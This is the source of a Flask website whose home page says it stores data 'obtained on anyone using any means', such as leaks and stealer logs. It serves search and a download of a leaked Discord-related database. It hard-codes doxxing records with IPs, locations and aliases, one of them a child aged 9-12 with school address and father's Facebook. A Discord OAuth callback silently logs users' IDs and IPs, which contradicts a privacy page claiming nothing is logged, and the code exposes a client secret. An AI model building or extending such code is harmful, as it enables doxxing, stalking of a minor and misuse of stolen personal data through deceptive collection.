from flask import Flask, request, send_file, abort, jsonify
import sqlite3
import requests
import logging

def init_db():
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS logins (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    discord_id TEXT,
                    ip_address TEXT
                )""")
    conn.commit()
    conn.close()

init_db()

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.INFO)

CLIENT_ID = "1410909662865522738"
CLIENT_SECRET = "dJoMgr7td7F_Ukv4gY--wIHnygKcokih"
REDIRECT_URI = "http://gotchalmao.lol/callback"

auth_url = f"https://discord.com/oauth2/authorize?client_id=1410909662865522738&response_type=code&redirect_uri=http%3A%2F%2Fgotchalmao.lol%3A25516%2Fcallback&integration_type=1&scope=identify+applications.commands"

MAX_RESULTS = 10

# ---------------- FAVICON ----------------
@app.route('/favicon.ico')
def favicon():
    return send_file("favicon.ico", mimetype="image/vnd.microsoft.icon")

@app.route("/callback")
def callback():
    code = request.args.get("code")
    ip_address = request.remote_addr  # <-- IP from request

    # Exchange code for access token
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_json = token_res.json()

    access_token = token_json["access_token"]

    # Get user info
    headers = {"Authorization": f"Bearer {access_token}"}
    user_res = requests.get("https://discord.com/api/users/@me", headers=headers)
    user_json = user_res.json()

    discord_id = user_json["id"]

    # Save to database
    conn = sqlite3.connect("users.db")
    c = conn.cursor()
    c.execute("INSERT INTO logins (discord_id, ip_address) VALUES (?, ?)", (discord_id, ip_address))
    conn.commit()
    conn.close()
    print(f"connected: {discord_id} , {ip_address}")
    return f"<a href='/'>Home</a> Hello, {user_json['username']}! You have added me to Discord!"


# ---------------- BLOCKED IPS ----------------
BLOCKED_IPS = {
    "0.0.0.0": "Place holder test"
}

@app.before_request
def check_blocked_ip():
    client_ip = request.remote_addr
    if client_ip in BLOCKED_IPS:
        reason = BLOCKED_IPS[client_ip]
        blocked_page = f"""
        <!DOCTYPE html>
        <html lang='en'>
        <head>
            <meta charset='UTF-8'>
            <title>Blocked</title>
            <link rel='icon' href='/favicon.ico' type='image/x-icon'>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f4f4f4; text-align: center; padding: 50px; }}
                .container {{ background: white; display: inline-block; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h1 {{ color: #FF4C4C; }}
                p {{ font-size: 16px; }}
                .reason {{ margin-top: 20px; padding: 15px; background: #ffe6e6; border-left: 5px solid #FF4C4C; text-align: left; max-width: 600px; margin-left: auto; margin-right: auto; word-wrap: break-word; }}
            </style>
        </head>
        <body>
            <div class='container'>
                <h1>Blocked</h1>
                <p>You have been blocked from this site. If you think this is a mistake, contact <strong>@ozzy0xd on Discord</strong>.</p>
                <p>Here is a message the owner left:</p>
                <div class='reason'>{reason}</div>
            </div>
        </body>
        </html>
        """
        return blocked_page, 403

# ---------------- EXAMPLE RECORDS ----------------
records = {
    1: {
        "LOG ID": "10c05678dcf5180c7a30566fec83493bb54a5844",
        "userid1": "1406171189088358490",
        "userid2": "1404390758529892362",
        "userid3": "1406631609720897596",
        "ip": "79.200.27.227",
        "location": "94032 Passau, Bavaria, Germany (48.5665, 13.4312)",
        "dads-facebook": "https://www.facebook.com/roseben.peter",
        "age": "9-12",
        "school": "GMS St. Nikola, Nikolastraße 11, 94032 Passau, Germany",
        "dad": "Peter Roseben",
        "origin": "Benin, Nigeria",
        "comment": "aka divine"
    },
    2: {
        "LOG ID": "43f7a8a644d857fc93417ed2fbe194456be50c90",
        "userid": "724685024984563723",
        "ip": "181.118.57.204",
        "location": "Chaguanas, Chaguanas, Trinidad and Tobago (10.5167, -61.4167)",
        "comment": "aka augustus"
    },
    3: {
        "LOG ID": "95355b77be4b98bc0aa9966b380b0a116999194b",
        "userid": "1373858252290523257",
        "ip-hash": "53616c7465645f5f78fe9694324410d0490f88e1cf5ce0da8ca882c2a7da8e8b",
        "comment": "aka love",
        "note": "pure ip is not obtainable by you. AES hash pass is needed."
    },
    4: {
        "LOG ID": "c37b794844d6c0394c4a1e13793068f8b7fb05b5",
        "userid": "694997100534169730",
        "ip": "174.216.6.128",
        "location": "27601 Raleigh, North Carolina, United States (35.7721, -78.6386)",
        "device": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
        "comment": "aka chips",
        "updated": "28/08/2025 16:00 UTC"
    }
}

# ---------------- SHARED CSS ----------------
BASE_STYLE = """
body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; color: #333; }
h1 { color: #333; }
.container { max-width: 800px; margin: auto; }
.card { background: white; border-radius: 8px; padding: 15px; margin: 10px 0; position: relative; box-shadow: 0 2px 6px rgba(0,0,0,0.1);}
.card button { position: absolute; top: 10px; right: 10px; padding: 5px 10px; border: none; border-radius: 4px; background: #007BFF; color: white; cursor: pointer; }
.card button:hover { background: #0056b3; }
.search-box input[type=text] { padding: 10px; width: 70%; border-radius: 5px; border: 1px solid #ccc; }
.search-box input[type=submit] { padding: 10px 15px; border: none; border-radius: 5px; background: #007BFF; color: white; cursor: pointer; }
.search-box input[type=submit]:hover { background: #0056b3; }
.nav { margin-bottom: 20px; }
.nav a { margin-right: 15px; text-decoration: none; color: #007BFF; }
.nav a:hover { text-decoration: underline; }
"""

# ---------------- HOME PAGE ----------------
HOME_PAGE = """
<html>
<head>
    <title>Home</title>
    <style>{style}</style>
</head>
<body>
<div class="container">
  <div class="nav">
    <a href="/">Home</a>
    <a href="/leaks/restorecord">Restorecord Search</a>
    <a href="/records">Records</a>
    <a href="/privacy">Privacy</a>
    <a href='https://discord.com/oauth2/authorize?client_id=1410909662865522738&response_type=code&redirect_uri=http%3A%2F%2Fgotchalmao.lol%2Fcallback&integration_type=1&scope=identify+applications.commands'>Add to Discord</a>
  </div>
  <h1>Welcome</h1>
  <p>This is hosted to store any data obtained on anyone using any means. For example, data leaks or stealer logs.</p>
  <p>By @ozzy0xd_ on Discord.</p>
</div>
</body>
</html>
""".format(style=BASE_STYLE, auth_url=auth_url, CLIENT_ID=CLIENT_ID, REDIRECT_URI=REDIRECT_URI)


# ---------------- RESTORECORD SEARCH PAGE ----------------
SEARCH_PAGE = """
<html>
<head>
    <title>Restorecord Search</title>
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:title" content="Restorecord Search">
    <meta property="og:description" content="Search the Restorecord 2024 leak.">
    <meta property="og:image" content="https://example.com/preview.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://example.com/leaks/restorecord">
    <meta name="twitter:card" content="summary_large_image">
    <style>{style}</style>
</head>
<body>
<div class="container">
  <div class="nav">
    <a href="/">Home</a>
    <a href="/leaks/restorecord">Restorecord Search</a>
    <a href="/records">Records</a>
    <a href="/downloads/restorecord">Download Restorecord Database</a>
  </div>
  <h1>Restorecord Search</h1>
  <form method="post" class="search-box">
    <input type="text" name="search_term" placeholder="Search this leak...">
    <input type="submit" value="Search">
  </form>
  <hr>
  {content}
</div>
</body>
</html>
"""

# ---------------- RECORDS PAGE ----------------
RECORDS_PAGE = """
<html>
<head>
    <title>Records</title>
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:title" content="Records Search">
    <meta property="og:description" content="Search and view logs.">
    <meta property="og:image" content="https://example.com/preview.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://example.com/records">
    <meta name="twitter:card" content="summary_large_image">
    <style>{style}</style>
</head>
<body>
<div class="container">
  <div class="nav">
    <a href="/">Home</a>
    <a href="/leaks/restorecord">Restorecord Search</a>
    <a href="/records">Records</a>
  </div>
  <h1>Records Search</h1>
  <form method="post" class="search-box">
    <input type="text" name="search_term" placeholder="Search records...">
    <input type="submit" value="Search">
  </form>
  <hr>
  {content}
</div>
<script>
function copyToClipboard(id, button) {{
    var text = document.getElementById(id).innerText;
    var textarea = document.createElement("textarea");
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    var originalText = button.innerText;
    var originalColor = button.style.background;
    button.innerText = "Copied!";
    button.style.background = "#43b581"; // green
    setTimeout(function() {{
        button.innerText = originalText;
        button.style.background = originalColor;
    }}, 2000);
}}
</script>
</body>
</html>
"""

# ---------------- PRIVACY POLICY ----------------
PRIVACY_NOTICE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Privacy Policy</title>
  <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
<a href="/">Home</a>
<h1>Privacy Policy</h1>
<p><strong>Effective Date:</strong> 25 August 2025</p>
<p><strong>Owner:</strong> @ozzy0xd_ (Discord)</p>
<p><strong>Contact:</strong> <a href="https://discord.com/users/ozzy0xd_">Discord Profile</a></p>
<h2>1. Introduction</h2>
<p>This Privacy Policy explains how this site handles information, user data, and privacy rights. By using this site, you agree to the terms of this policy. This site is operated as a private service and complies with relevant privacy and cyber laws in effect <strong>up to August 2025.</strong></p>
<h2>2. Data Collection</h2>
<p>By default, <strong>no data is logged</strong>. This includes IP addresses, user agents, browsing history, and search queries. Information is only collected under the following circumstances:</p>
<ul>
  <li>Improper, illegal, or prohibited use of this site is reported.</li>
  <li>Suspicion of fraud, abuse, or violation of applicable laws.</li>
</ul>
<p>In these cases, IP addresses and user agents may be temporarily logged, and offending users may be blacklisted.</p>
<h2>3. Data Removal Requests</h2>
<p>If you wish to request removal of your records, contact <strong>@ozzy0xd_ on Discord</strong>. You must provide the <strong>LOG ID</strong>, which appears on each record. Without this, requests cannot be processed. Data removal applies only to records and does not extend to external services, cached copies, or third-party systems.</p>
<h2>4. Browser Requirements</h2>
<p>To access this site securely, you must use a supported modern browser. Officially supported browsers include:</p>
<ul>
<li>Google Chrome (v138+)</li>
<li>Apple Safari (v18+ including iOS Safari)</li>
<li>Microsoft Edge (v138+; supported on Windows 10 until at least 2028)</li>
<li>Mozilla Firefox (v141+)</li>
<li>Opera (latest stable Chromium-based version)</li>
<li>Brave (latest stable version)</li>
<li>DuckDuckGo Browser (latest stable mobile version)</li>
<li>Samsung Internet (latest stable version on Android)</li>
</ul>
<h2>5. Legal Compliance</h2>
<ul>
<li><strong>UK GDPR</strong></li>
<li><strong>Data Protection Act 2018</strong></li>
<li><strong>Online Safety Act 2023</strong></li>
<li><strong>Computer Misuse Act 1990</strong></li>
<li><strong>Cybersecurity and Resilience Bill 2024</strong></li>
<li><strong>Communications Act 2003</strong></li>
<li><strong>Investigatory Powers Act 2016</strong></li>
</ul>
<h2>6. International Human Rights</h2>
<ul>
<li><strong>UDHR</strong> – Article 12 (privacy), Article 19 (freedom of expression)</li>
<li><strong>ICCPR</strong> – Article 17 (privacy), Article 19 (freedom of expression)</li>
<li><strong>ECHR</strong> – Article 8 (respect for private life), Article 10 (freedom of expression)</li>
</ul>
<h2>7. User Rights</h2>
<ul>
<li>Access to your records (if any exist).</li>
<li>Correction or removal of incorrect records (LOG ID required).</li>
<li>Clarification of how your information has been handled.</li>
</ul>
<h2>8. User Responsibilities</h2>
<p>You agree not to misuse this site, attempt unauthorized access, or conduct illegal activities. Misuse may result in blacklisting and reporting to authorities where required by law.</p>
<h2>9. Data Security</h2>
<p>Any temporary logs are stored securely and removed when no longer necessary. This site uses standard security practices to prevent unauthorized access or disclosure.</p>
<h2>10. Data Retention</h2>
<p>Data is retained only as long as necessary for the purpose of investigation, misuse prevention, or compliance with legal obligations. Non-offending users generate no retained data.</p>
<h2>11. Third-Party Links</h2>
<p>This site may contain links to third-party services. This Privacy Policy does not apply to third-party websites or platforms. Please review their respective privacy policies before use.</p>
<h2>12. Policy Updates</h2>
<p>This Privacy Policy may be updated to reflect legal, technical, or operational changes. Updated versions will replace this notice immediately upon publication.</p>
<h2>13. Limitation of Liability</h2>
<p>The site owner is not responsible for misuse by third parties, unsupported browsers, or any activity outside the scope of this policy. By using this site, you acknowledge and accept these limitations.</p>
<p><strong>By accessing this site using a supported browser, you confirm that you have read, understood, and agreed to this Privacy Policy.</strong></p>
</body>
</html>
"""

# ---------------- DOWNLOAD ----------------
@app.route("/downloads/restorecord")
def download_restorecord():
    return send_file(
        "restorecord.csv",
        as_attachment=True,
        download_name="restorecord.csv",
        mimetype="text/csv"
    )


# ---------------- CSV SEARCH FUNCTION ----------------
def search_csv(file_path, search_term, max_results=10):
    results = []
    search_term_lower = search_term.lower()
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                if search_term_lower in line.lower():
                    parts = line.strip().split(",")
                    if len(parts) < 4:
                        continue
                    results.append(parts)
                    if len(results) >= max_results:
                        break
    except FileNotFoundError:
        pass
    return results

# ---------------- ROUTES ----------------
@app.route("/")
def home():
    print(f"\nUA: {request.headers.get('User-Agent', 'Unknown')}")
    return HOME_PAGE

@app.route("/leaks/restorecord", methods=["GET", "POST"])
def restorecord_search():
    print(f"\nUA: {request.headers.get('User-Agent', 'Unknown')}")
    content = ""
    if request.method == "POST":
        term = request.form.get("search_term", "")
        if term:
            rows = search_csv('restorecord.csv', term, MAX_RESULTS)
            if rows:
                for r in rows:
                    content += f'<div class="card">'
                    content += f"<b>UserID:</b> {r[1] if len(r)>1 else 'N/A'}<br>"
                    content += f"<b>Username:</b> {r[2] if len(r)>2 else 'N/A'}<br>"
                    content += f"<b>IP:</b> {r[3] if len(r)>3 else 'N/A'}<br>"
                    content += f"<b>Date:</b> {r[-1] if len(r)>0 else 'N/A'}"
                    content += "</div>"
            else:
                content = "<p>No results found.</p>"
    return SEARCH_PAGE.format(style=BASE_STYLE, content=content)

@app.route("/privacy", methods=["GET"])
def privacy():
    return PRIVACY_NOTICE

@app.route("/records", methods=["GET", "POST"])
def records_search():
    print(f"\nUA: {request.headers.get('User-Agent', 'Unknown')}")
    content = ""
    if request.method == "POST":
        term = request.form.get("search_term", "").lower()
        matches = {}
        for rec_id, rec_data in records.items():
            for key, value in rec_data.items():
                if term in key.lower() or term in str(value).lower():
                    matches[rec_id] = rec_data
                    break
        if matches:
            for rec_id, rec_data in matches.items():
                content += f'<div class="card">'
                content += f'<button onclick="copyToClipboard(\'rec{rec_id}\', this)">Copy</button>'
                content += f'<div id="rec{rec_id}">'
                for k, v in rec_data.items():
                    content += f"<b>{k}:</b> {v}<br>"
                content += "</div></div>"
        else:
            content = "<p>No records found.</p>"
    return RECORDS_PAGE.format(style=BASE_STYLE, content=content)

@app.route("/api/records", methods=["GET"])
def api_records():
    query = request.args.get("q", "").lower()
    results = []
    for rec_id, rec_data in records.items():
        if query:
            for key, value in rec_data.items():
                if query in key.lower() or query in str(value).lower():
                    results.append({"id": rec_id, **rec_data})
                    break
        else:
            results.append({"id": rec_id, **rec_data})
    return jsonify(results)


@app.route("/api/restorecord", methods=["GET"])
def api_restorecord():
    query = request.args.get("q", "")
    if not query:
        return jsonify({"error": "Missing ?q= parameter"}), 400

    rows = search_csv("restorecord.csv", query, MAX_RESULTS)
    results = []
    for r in rows:
        results.append({
            "UserID": r[1] if len(r) > 1 else None,
            "Username": r[2] if len(r) > 2 else None,
            "IP": r[3] if len(r) > 3 else None,
            "Date": r[-1] if len(r) > 0 else None
        })
    return jsonify(results)

# ---------------- RUN ----------------
if __name__ == "__main__":
    app.run("0.0.0.0", 80)
